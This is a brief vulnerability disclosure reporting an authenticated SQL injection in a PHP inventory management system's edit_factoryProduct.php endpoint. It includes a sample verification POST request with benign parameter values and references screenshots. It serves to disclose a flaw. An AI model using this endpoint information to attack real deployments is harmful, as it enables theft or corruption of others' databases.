



The Free and Open Source inventory management system has an SQL injection vulnerability that an attacker, if authenticated, can exploit to steal information or corrupt a database.





Source code address：https://www.sourcecodester.com/php/16741/free-and-open-source-inventory-management-system-php-source-code.html



The vulnerability is located in the /app/action/edit_factoryProduct.php file, and you can see in the code snippet that there is an operation to update the information.

![image-20250326144507703](images/image-20250326144507703.png)





Vulnerability verification：

```
POST /ample/app/action/edit_factoryProduct.php HTTP/1.1
Host: 192.168.80.152
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
DNT: 1
Cookie:  PHPSESSID=c4gam437gl7cc6hlbsgm3pplq4
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 102

id=1&product_name=1&brand=1&p_catagory=1&quantity=1&alert_quantity=1&product_expense=1&selling_price=1
```

 ![image-20250326144457215](images/image-20250326144457215.png)



































